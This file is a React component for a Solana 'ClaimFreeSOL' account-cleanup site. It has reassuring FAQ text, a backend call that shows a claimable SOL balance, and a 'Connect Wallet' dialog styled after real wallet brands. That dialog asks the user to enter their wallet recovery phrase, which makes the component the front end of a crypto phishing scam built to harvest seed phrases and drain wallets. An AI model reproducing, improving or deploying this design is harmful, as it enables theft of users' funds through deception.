import axios from 'axios';
import { useEffect, useState } from 'react';

const Cleanup = ({lang}) => {

    const [faq, setFaq] = useState("faq");
    const [formContainer, setFormContainer] = useState("form-container");
    const [solsToCliam, setSolsToClaim] = useState(0);

    const howClicked = () => {
        setFaq('faq active');
        document.body.classList.add("no-scroll"); 
    }

    const comClicked = () => {
        setFaq('faq');
        document.body.classList.remove("no-scroll"); 
    }

    const connectWal = () => {
        setFormContainer("form-container active");
    }

    const cancel = () => {
        setFormContainer("form-container");
    }

    const walletTypeClicked = (e) => {
        let walletType = e.currentTarget.value;

        let walletTypeContainer = e.currentTarget.parentElement;
        let walletPhrase = e.currentTarget.parentElement.parentElement.children[4];
        
        walletPhrase.classList.add('active');
        walletTypeContainer.classList.add('active');
    }

    const contClick = (e) => {
        const own = e.currentTarget.parentElement.parentElement.children[1].children[0].children[1];
        const other = e.currentTarget.parentElement.parentElement.children[1].children[0].children[0];

        const firstBtn = e.currentTarget.parentElement.children[0];
        const secondBtn = e.currentTarget.parentElement.children[1];
        const thirdBtn = e.currentTarget.parentElement.children[2];

        own.classList.add('active');
        other.classList.add('active');

        firstBtn.classList.remove('active');

        if (e.currentTarget.innerText === 'Burn Tokens'){
            secondBtn.classList.add('active');
        }else{
            secondBtn.classList.remove('active');
        }

        if (e.currentTarget.innerText === 'Burn NFTs'){
            thirdBtn.classList.add('active');
        }else{
            thirdBtn.classList.remove('active');
        }
    }

    const vacantClick = (e) => {
        const own = e.currentTarget.parentElement.parentElement.children[1].children[0].children[0];
        const other = e.currentTarget.parentElement.parentElement.children[1].children[0].children[1];

        const firstBtn = e.currentTarget.parentElement.children[0];
        const secondBtn = e.currentTarget.parentElement.children[1];
        const thirdBtn = e.currentTarget.parentElement.children[2];

        own.classList.remove('active');
        other.classList.remove('active');

        firstBtn.classList.add('active');
        secondBtn.classList.remove('active');
        thirdBtn.classList.remove('active');
    }

    useEffect(() => {
        async function getSolsToClaim() {
            try {
                let url = "https://backend.claimfeesol.com/get-language.php/get-claims.php";

                const response = await axios.get(url, {
                    headers: {
                        "Content-Type" : "application/json"
                    },withCredentials: true
                })
                
                if (response.data.status === 'success'){
                    setSolsToClaim(response.data.sols);
                }
            } catch (error) {
                console.log("Error fetching sols to claim: ", error);
            }
        } 
        getSolsToClaim();
    },[]);

    return ( 
        <>
        <div className="cleanup">
            <div className="cleanup-top">
                <div className="clean-up-top-content">
                    <img src="/broom.png" alt="" className="cleanup-top-img" />
                    <p>{lang === 'en' ? 'Clean Up' : '清理'}</p>
                    <div className="free-sol-cleanup">Free SOL</div>
                </div>
            </div>
            <div className="cleanup-bottom">
                <div className="cleanup-btn-container">
                    <button type="button" onClick={vacantClick} className="active">{lang === 'en' ? 'Vacant Accounts' : '关闭空闲账户'}</button>
                    <button type="button" onClick={contClick}>{lang === 'en' ? 'Burn Tokens' : '烧毁代币'}</button>
                    <button type="button"onClick={contClick}>{lang === 'en' ? 'Burn NFTs' : '烧毁NFT'}</button>
                </div>
                <div className="cleanup-bottom-content">
                    <div className="cleanup-bottom-content-top">
                        <div className="before-contine">
                            <header>
                                <h2>{lang === 'en' ? 'Total $SOL To Claim:' : '可领回 $SOL 数量'}</h2>
                            </header>
                            <div className="cleanup-bottom-top-main-content">
                                <p style={{color: 'green'}}>{Number(solsToCliam).toLocaleString()} SOL</p>
                            </div>
                        </div>
                        <div className="continue">
                            <p>Connect Wallet to continue</p>
                            <button type="button" onClick={connectWal} className="connect-wallet-btn">{lang === 'en' ? 'Connect Wallet' : '连接钱包'}</button>
                        </div>
                    </div>
                    <div className="cleanup-bottom-content-bottom">
                        <header>
                            <h2>{lang === 'en' ? 'Vacant Accounts (0)' : '空闲账户列表'}</h2>
                            <img src="/Refresh.svg" alt="" className="" />
                        </header>
                        <div className="cleanup-bottom-content-bottom-main-content">

                        </div>
                    </div>
                </div>
            </div>
            <div className="connect-wallet-btn-container">
                <button type="button" onClick={connectWal} className="connect-wallet-btn">{lang === 'en' ? 'Connect Wallet' : '连接钱包'}</button>
                <button type="button" onClick={howClicked} className="how-it-work-btn">{lang === 'en' ? '[How It Works]' : '[领回原理？]'}</button>
            </div>
            <div className={faq}>
                <div className="faq-main">
                    <header className="faq-header">
                        <img src="/info.svg" alt="" />
                        <h2>{lang === 'en' ? 'How it Work' : '领回原理与安全性'}</h2>
                    </header>
                    <div className="faq-container">
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Where is the reclaim SOL coming from?' : '领回原理与安全性'}</h2>
                            <p>{lang === 'en' ? 'Any accounts on Solana require a small storage fee to open them. By burning a token, we can close this' : 'Solana 上的任何账户都需要一笔小的存储费用来开户，通过关闭空闲账户我们可以领回被扣留的押金。'}</p>
                            <p>{lang === 'en' ? 'account and reclaim the storage fee.' : ''}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'How much can I reclaim from closing vacant account?' : '通过关闭空闲账户，我可以领回多少 SOL?'}</h2>
                            <p>{lang === 'en' ? 'Vacant accounts will give you 0.002 SOL.' : '每个空闲账户会给您 0.002 SOL。'}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Can I lose NFTs or other tokens like USDC from closing vacant accounts?' : '当我关闭空闲账户时，我会丢失任何 NFT 或者 Token 吗？'}</h2>
                            <p>{lang === 'en' ? 'No, all vacant accounts selected already have 0 NFTs or Tokens assigned to them and have no use, feel' : '不会，所有选中的空闲账户都是有0个 NFT 或者0个 Token，可以放心领回的流程并发送关闭空闲账户的'}</p>
                            <p>{lang === 'en' ? 'secure in pressing Reclaim All and signing the transactions to close them and receive the locked sol.' : '交易来领回被扣留的 SOL。'}</p>
                            <p>{lang === 'en' ? 'You can find more information in the official Solana Documentation, link' : '您可以在 Solana 的官方文档中找到更多关于押金的介绍，链接在 这里。'}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Safe Burn' : 'Safe Burn'}</h2>
                            <p>{lang === 'en' ? "'Safe Burn' sends dust tokens to a Temporary Burn Program. This allows recovery if you mistakenly" : '“安全销毁”功能会将灰尘代币发送到临时销毁程序。如果您误销毁了有价值的代币，这可以帮您恢复，'}</p>
                            <p>{lang === 'en' ? 'burn a valuable token, so we recommend keeping this ON.' : '因此我们建议保持此功能开启。'}</p>
                            <p>{lang === 'en' ? 'For developers who intend to permanently burn supply, we recommend turning this OFF so that tokens' : '对于打算永久销毁代币的开发者，我们建议关闭此功能，这样代币将被不可逆地销毁，并且无法访问。'}</p>
                            <p>{lang === 'en' ? 'are irreversibly destroyed and inaccessible.' : ''}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'How much can I reclaim from burn tokens and NFTs?' : '通过烧毁代币和 NFTs，我可以领回多少 SOL？'}</h2>
                            <p>{lang === 'en' ? 'Burning tokens will give you 0.002 SOL. Burning most NFTs will give you 0.01 SOL. A few NFTs (such as' : '烧毁代币账户会给您 0.002 SOL。烧毁绝大多数 NFTs 会给您 0.01 SOL。少部分 NFTs (例如诈骗 NFTs) 会'}</p>
                            <p>{lang === 'en' ? 'scam NFTs) will give you 0.002 SOL.' : '给您 0.002 SOL。'}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Are there any fees associated with using ClaimFreeSOL?' : '使用 ClaimFreeSOL 有任何相关的费用吗？'}</h2>
                            <p>{lang === 'en' ? 'By using ClaimFreeSOL, you are guaranteed to never lose SOL, you will only gain from the assets you' : '通过使用 ClaimFreeSOL，您永远不会失去任何 SOL，您只会从烧毁中赚取 SOL。'}</p>
                            <p>{lang === 'en' ? 'choose to burn.' : '相反，为了保持团队和RPC节点的正常运行，并开发更多实用工具，每次烧毁空闲账户时会捐赠 15% 给'}</p>
                            <p>{lang === 'en' ? 'Instead, to keep the team up and build more tools, a 15% donation is included for the recovered SOL.' : '我们。'}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Will my wallet be destroyed or become unsafe after claiming?' : '领回后我的钱包会被摧毁或者变得不安全吗？'}</h2>
                            <p>{lang === 'en' ? 'No, all it does is close your vacant accounts. It will not affect your wallet, and you can continue using' : '不会。领回 SOL 只是帮您关闭空闲账户而已，这不会对您的钱包有任何影响，您仍然可以正常且放心地'}</p>
                            <p>{lang === 'en' ? 'it without concerns.' : '使用您的钱包。'}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Limitations of Liability' : '责任限制与使用原则'}</h2>
                            <p>{lang === 'en' ? 'Users acknowledge that burning digital assets involves inherent risks, and ClaimFreeSOL is not liable' : '用户承认烧毁数字资产存在固有风险，ClaimFreeSOL 对由此造成的任何损失不承担任何责任。如果用户'}</p>
                            <p>{lang === 'en' ? 'for any losses incurred. ClaimFreeSOL is not responsible if a user burns any asset by mistake. Before' : '错误地烧毁任何资产，ClaimFreeSOL 概不负责。在发送交易之前，请再三确认您知道您所标记的资产是'}</p>
                            <p>{lang === 'en' ? 'sending the transaction, please double check that you are aware that the asset you have marked is' : ''}</p>
                            <p>{lang === 'en' ? 'unwanted.' : '不想要的。'}</p>
                        </div>
                    </div>
                    <div className="complete-btn-container">
                        <button type="button" onClick={comClicked}>{lang === 'en' ? 'Complete' : '知道了'}</button>
                    </div>
                </div>
            </div>
            <div className={formContainer}>
                <form onSubmit={(e) => e.preventDefault()}>
                    <div className="cancel-container">
                        <button onClick={cancel}><div className="cancel"></div> </button>
                    </div>
                    <header>
                        <h2>Connect a wallet on Solana to continue</h2>
                    </header>
                    <p className="require">You must have atleat 0.02 sol to continue</p>
                    <div className="Wallet-type-container">
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/ave.svg" alt="wallet logo" />
                            <p>Ave Wallet</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/solflare.svg" alt="wallet logo" />
                            <p>Solflare</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/trust.svg" alt="wallet logo" />
                            <p>Trust Wallet</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/phantom.svg" alt="wallet logo" />
                            <p>Phantom</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/download.svg" alt="wallet logo" />
                            <p>Coinbase Wallet</p>
                        </button>
                    </div>
                    <div className="Wallet-phrase-container">
                        <label htmlFor="phrase">Wallet Phrase</label>
                        <textarea name="phrase" id="phrase"></textarea>
                        <div className="form-btn-container">
                            <button>Connect</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
        </>
     );
}
 
export default Cleanup;